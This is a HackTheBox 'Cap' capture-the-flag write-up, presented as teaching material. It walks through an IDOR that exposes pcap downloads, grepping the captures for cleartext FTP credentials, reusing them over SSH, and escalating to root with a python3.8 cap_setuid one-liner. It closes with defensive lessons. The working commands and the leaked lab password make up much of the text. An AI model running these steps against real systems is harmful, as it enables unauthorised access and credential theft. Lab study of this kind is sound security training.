# HTB: Cap — Writeup

**Difficulty:** Easy
**OS:** Linux

## Recon

Full TCP port scan:
```bash
nmap -sC -sV -p- <TARGET_IP>
```

Results:
```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
```

Three services: FTP, SSH, and a custom Python (Gunicorn/Flask-style) web app titled "Security Dashboard." vsftpd 3.0.3 is not the backdoored 2.3.4 version, so no quick win there — the web app is the lead.

## Web enumeration — IDOR on pcap downloads

The "Security Dashboard" lets users download network capture (`.pcap`) files, e.g. `/download/1`. Tested adjacent IDs for an Insecure Direct Object Reference (no ownership/session check on the download endpoint):

```bash
for i in 0 1 2 3 4 5; do
  curl -s -o test_$i.pcap -w "%{http_code} %{size_download} bytes\n" http://<TARGET_IP>/download/$i
done
```

Results: IDs `0`, `1`, `2` returned real pcap data with no authentication required at all — full IDOR, any unauthenticated request could pull any capture by changing the number.

## Credential extraction from pcap

Read the captures with `tcpdump` (or Wireshark: File → Open, filter `ftp`, right-click → Follow → TCP Stream):

```bash
tcpdump -r test_0.pcap -nn -A | grep -iE "USER|PASS"
```

Found a cleartext FTP login inside capture `0`:
```
FTP: USER nathan
FTP: PASS Buck3tH4TF0RM3!
```

## Foothold — password reuse

Port 22 (SSH) was open. Tried the leaked FTP credentials there on the assumption of password reuse:

```bash
ssh nathan@<TARGET_IP>
# password: Buck3tH4TF0RM3!
```

Logged in successfully as `nathan`. (Note: if backspace misbehaves in the shell, run `stty sane`.)

## Privilege escalation — Linux capabilities

Checked for binaries with special Linux capabilities set (a SUID-adjacent mechanism — a binary can be granted one specific root-like power without being fully SUID-root):

```bash
getcap -r / 2>/dev/null
```

Result:
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`python3.8` has `cap_setuid` — it can change its own UID, and since Python executes arbitrary code, this is a direct root escalation:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

This spawns a root shell. Confirmed with `id` → `uid=0(root)`.

## Summary of the chain

1. Full port scan → found custom web app on :80
2. IDOR on `/download/<id>` → pulled other users' pcap files with zero auth
3. Grepped pcap for FTP creds → `nathan:Buck3tH4TF0RM3!`
4. Password reuse → SSH login as `nathan`
5. `getcap -r /` → found `cap_setuid` on `python3.8`
6. `os.setuid(0)` via Python → root

## Lessons for teaching

- IDOR: never trust a numeric ID in a URL without an authorization check server-side.
- Cleartext protocols (FTP) leak creds to anyone who can capture traffic — a great real-world argument for SFTP/FTPS.
- Password reuse across services is one of the most common real-world escalation paths — check it early.
- `getcap -r /` should be a standard enumeration step alongside `find / -perm -4000` (SUID) during privesc.
